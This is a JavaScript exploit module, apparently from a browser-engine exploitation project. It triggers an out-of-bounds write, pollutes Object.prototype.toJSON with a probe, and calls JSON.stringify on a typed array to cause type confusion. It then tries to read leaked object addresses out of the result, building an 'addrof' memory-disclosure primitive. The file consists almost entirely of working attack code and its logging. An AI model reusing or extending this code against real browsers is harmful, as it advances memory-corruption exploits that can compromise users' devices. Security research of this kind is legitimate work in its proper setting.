// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v25_RevisitAggressiveWritesOnReturnedMarker)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V25_RAWRM = "OriginalHeisenbug_TypedArrayAddrof_v25_RevisitAggressiveWrites";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const AGGRESSIVE_PROP_COUNT_V25 = 32; 

let object_to_leak_A_v25 = null;
let object_to_leak_B_v25 = null;
let victim_typed_array_ref_v25 = null; 
let probe_call_count_v25 = 0;
let last_probe_details_v25 = null; 
const PROBE_CALL_LIMIT_V25 = 5; // Para evitar RangeError

function toJSON_TA_Probe_RevisitAggressiveWrites() {
    probe_call_count_v25++;
    const call_num = probe_call_count_v25;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v25_RevisitAggressiveWrites",
        this_type: Object.prototype.toString.call(this),
        this_is_victim_array: (this === victim_typed_array_ref_v25),
        this_is_prev_marker: (typeof this === 'object' && this !== null && this.hasOwnProperty('marker_id_v25') && this.marker_id_v25 === `MARKER_CALL_${call_num - 1}`),
        writes_on_confused_marker_attempted: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim_array}. IsPrevMarker? ${current_call_details.this_is_prev_marker}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V25) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit exceeded. Returning simple stop object.`, "warn");
            last_probe_details_v25 = current_call_details;
            return { recursion_stopped_v25: true };
        }

        if (call_num === 1 && current_call_details.this_is_victim_array) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim_array. Returning new marker M${call_num}.`, "info");
            last_probe_details_v25 = current_call_details;
            return { marker_id_v25: `MARKER_CALL_${call_num}` };
        } else if (current_call_details.this_is_prev_marker && current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON PREVIOUS MARKER (now 'this')! Marker ID: ${this.marker_id_v25}. Applying AGGRESSIVE writes...`, "vuln");
            
            this.leaky_A_v25 = object_to_leak_A_v25;
            this.leaky_B_v25 = object_to_leak_B_v25;
            for (let i = 0; i < AGGRESSIVE_PROP_COUNT_V25; i++) {
                this[i] = (i % 2 === 0) ? object_to_leak_A_v25 : object_to_leak_B_v25;
            }
            current_call_details.writes_on_confused_marker_attempted = true;
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Aggressive writes to confused marker 'this' completed. Keys: ${Object.keys(this).join(',')}`, "info");
            
            last_probe_details_v25 = current_call_details;
            return this; // Retornar o marcador modificado para que JSON.stringify o serialize
        } else if (current_call_details.this_type === '[object Object]') {
            // É um [object Object], mas não o marcador esperado. Tentativa padrão de escrita.
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an unexpected [object Object]. Attempting standard writes...`, "warn");
            this.generic_confused_A = object_to_leak_A_v25;
            this.generic_confused_B = object_to_leak_B_v25;
            current_call_details.writes_on_confused_this_attempted = true; // Renomear flag se necessário
            last_probe_details_v25 = current_call_details;
            return this; // Retornar este 'this' modificado
        }

    } catch (e) {
        current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + `ProbeErr: ${e.name}: ${e.message}`;
    }
    
    last_probe_details_v25 = current_call_details;
    return { marker_id_v25: `MARKER_CALL_${call_num}`, generic_return_v25: true }; 
}

export async function executeTypedArrayVictimAddrofTest_RevisitAggressiveWrites() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V25_RAWRM}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (RevisitAggressiveWrites) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V25_RAWRM} Init...`;

    probe_call_count_v25 = 0;
    last_probe_details_v25 = null; 
    victim_typed_array_ref_v25 = null; 
    object_to_leak_A_v25 = { marker: "ObjA_TA_v25rawrm", id: Date.now() }; 
    object_to_leak_B_v25 = { marker: "ObjB_TA_v25rawrm", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let captured_last_probe_details_final = null;
    
    let addrof_Victim_A = { success: false, msg: "VictimA: Default" };
    let addrof_Victim_B = { success: false, msg: "VictimB: Default" };
    let addrof_Marker_Leaky_A = { success: false, msg: "Marker.leaky_A: Default"};
    let addrof_Marker_Leaky_B = { success: false, msg: "Marker.leaky_B: Default"};
    let addrof_Marker_Idx0 = { success: false, msg: "Marker[0]: Default"};

    const fillPattern = 0.25252525252525;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v25 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v25.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v25 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_RevisitAggressiveWrites, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v25); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output was: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput };
            }
            
            if (last_probe_details_v25) { // Should be details from the last probe call (e.g., Call #3)
                captured_last_probe_details_final = JSON.parse(JSON.stringify(last_probe_details_v25)); 
            }
            logS3(`  EXECUTE: Captured details of LAST probe run: ${captured_last_probe_details_final ? JSON.stringify(captured_last_probe_details_final) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnReturnedMarker = false;
            if (captured_last_probe_details_final && 
                captured_last_probe_details_final.this_is_prev_marker &&
                captured_last_probe_details_final.this_type === "[object Object]") {
                heisenbugOnReturnedMarker = true;
            }
            logS3(`  EXECUTE: Heisenbug on Returned Marker ${heisenbugOnReturnedMarker ? "CONFIRMED" : "NOT Confirmed"}. Last relevant probe type: ${captured_last_probe_details_final ? captured_last_probe_details_final.this_type : 'N/A'}`, heisenbugOnReturnedMarker ? "vuln" : "error", FNAME_CURRENT_TEST);
                
            logS3("STEP 3: Checking victim buffer (should be unchanged)...", "warn", FNAME_CURRENT_TEST);
            const val_A_victim = float64_view_on_victim_buffer[0];
            if (val_A_victim !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] changed! Val: ${val_A_victim}`; else addrof_Victim_A.msg = `Victim buffer[0] unchanged.`;
            const val_B_victim = float64_view_on_victim_buffer[1];
            if (val_B_victim !== (fillPattern + 1)) addrof_Victim_B.msg = `Victim buffer[1] changed! Val: ${val_B_victim}`; else addrof_Victim_B.msg = `Victim buffer[1] unchanged.`;

            logS3("STEP 4: Checking stringifyOutput_parsed (the potentially modified marker object)...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object') {
                 if (stringifyOutput_parsed.marker_id_v25 && stringifyOutput_parsed.marker_id_v25.startsWith("MARKER_CALL_")) { // Verifica se é um dos nossos marcadores
                    logS3(`  stringifyOutput_parsed appears to be a marker object (ID: ${stringifyOutput_parsed.marker_id_v25}). Checking its properties...`, "info");
                    
                    const marker_leaky_A_val = stringifyOutput_parsed.leaky_A_v25;
                    if (typeof marker_leaky_A_val === 'number' && marker_leaky_A_val !==0) {
                        let mkr_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([marker_leaky_A_val]).buffer)[0], new Uint32Array(new Float64Array([marker_leaky_A_val]).buffer)[1]);
                        if (mkr_A_int64.high() < 0x00020000 || (mkr_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_Marker_Leaky_A.success = true; addrof_Marker_Leaky_A.msg = `Possible pointer for leaky_A_v25 in marker: ${mkr_A_int64.toString(true)}`;
                        } else { addrof_Marker_Leaky_A.msg = `Marker.leaky_A_v25 is num but not ptr: ${marker_leaky_A_val}`; }
                    } else if (marker_leaky_A_val === object_to_leak_A_v25) {
                         addrof_Marker_Leaky_A.success = true; addrof_Marker_Leaky_A.msg = "object_to_leak_A_v25 identity in marker.leaky_A_v25.";
                    } else { addrof_Marker_Leaky_A.msg = `Marker.leaky_A_v25 not ptr. Val: ${marker_leaky_A_val}`; }

                    const marker_leaky_B_val = stringifyOutput_parsed.leaky_B_v25;
                    // ... (similar para leaky_B_v25)
                    if (typeof marker_leaky_B_val === 'number' && marker_leaky_B_val !==0) {
                        let mkr_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([marker_leaky_B_val]).buffer)[0], new Uint32Array(new Float64Array([marker_leaky_B_val]).buffer)[1]);
                        if (mkr_B_int64.high() < 0x00020000 || (mkr_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_Marker_Leaky_B.success = true; addrof_Marker_Leaky_B.msg = `Possible pointer for leaky_B_v25 in marker: ${mkr_B_int64.toString(true)}`;
                        } else { addrof_Marker_Leaky_B.msg = `Marker.leaky_B_v25 is num but not ptr: ${marker_leaky_B_val}`; }
                    } else if (marker_leaky_B_val === object_to_leak_B_v25) {
                         addrof_Marker_Leaky_B.success = true; addrof_Marker_Leaky_B.msg = "object_to_leak_B_v25 identity in marker.leaky_B_v25.";
                    } else { addrof_Marker_Leaky_B.msg = `Marker.leaky_B_v25 not ptr. Val: ${marker_leaky_B_val}`; }

                    const marker_idx0_val = stringifyOutput_parsed["0"]; // Checa a propriedade numérica
                     if (typeof marker_idx0_val === 'number' && marker_idx0_val !==0) {
                        let mkr_idx0_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([marker_idx0_val]).buffer)[0], new Uint32Array(new Float64Array([marker_idx0_val]).buffer)[1]);
                        if (mkr_idx0_int64.high() < 0x00020000 || (mkr_idx0_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_Marker_Idx0.success = true; addrof_Marker_Idx0.msg = `Possible pointer for marker[0]: ${mkr_idx0_int64.toString(true)}`;
                        } else { addrof_Marker_Idx0.msg = `Marker[0] is num but not ptr: ${marker_idx0_val}`; }
                    } else if (marker_idx0_val === object_to_leak_A_v25) {
                         addrof_Marker_Idx0.success = true; addrof_Marker_Idx0.msg = "object_to_leak_A_v25 identity in marker[0].";
                    } else { addrof_Marker_Idx0.msg = `Marker[0] not ptr. Val: ${marker_idx0_val}`; }
                 } else {
                    addrof_Marker_Leaky_A.msg = "stringifyOutput_parsed was not an expected marker object.";
                    addrof_Marker_Leaky_B.msg = "stringifyOutput_parsed was not an expected marker object.";
                    addrof_Marker_Idx0.msg = "stringifyOutput_parsed was not an expected marker object.";
                 }
            } else {
                addrof_Marker_Leaky_A.msg = "stringifyOutput was not an object or was null.";
                addrof_Marker_Leaky_B.msg = "stringifyOutput was not an object or was null.";
                addrof_Marker_Idx0.msg = "stringifyOutput was not an object or was null.";
            }


            if (addrof_Marker_Leaky_A.success || addrof_Marker_Leaky_B.success || addrof_Marker_Idx0.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V25_RAWRM}: AddrInMarker SUCCESS!`;
            } else if (heisenbugOnReturnedMarker) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V25_RAWRM}: MarkerTC OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V25_RAWRM}: No MarkerTC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V25_RAWRM}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V25_RAWRM} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v25}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: Success=${addrof_Victim_A.success}, Msg='${addrof_Victim_A.msg}'`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim B: Success=${addrof_Victim_B.success}, Msg='${addrof_Victim_B.msg}'`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Marker.leaky_A: Success=${addrof_Marker_Leaky_A.success}, Msg='${addrof_Marker_Leaky_A.msg}'`, addrof_Marker_Leaky_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Marker.leaky_B: Success=${addrof_Marker_Leaky_B.success}, Msg='${addrof_Marker_Leaky_B.msg}'`, addrof_Marker_Leaky_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Marker[0]: Success=${addrof_Marker_Idx0.success}, Msg='${addrof_Marker_Idx0.msg}'`, addrof_Marker_Idx0.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v25 = null; 
        last_probe_details_v25 = null;
        probe_call_count_v25 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: captured_last_probe_details_final, 
        total_probe_calls: probe_call_count_v25,
        addrof_victim_A: addrof_Victim_A,
        addrof_victim_B: addrof_Victim_B,
        addrof_marker_leaky_A: addrof_Marker_Leaky_A,
        addrof_marker_leaky_B: addrof_Marker_Leaky_B,
        addrof_marker_idx0: addrof_Marker_Idx0
    };
}
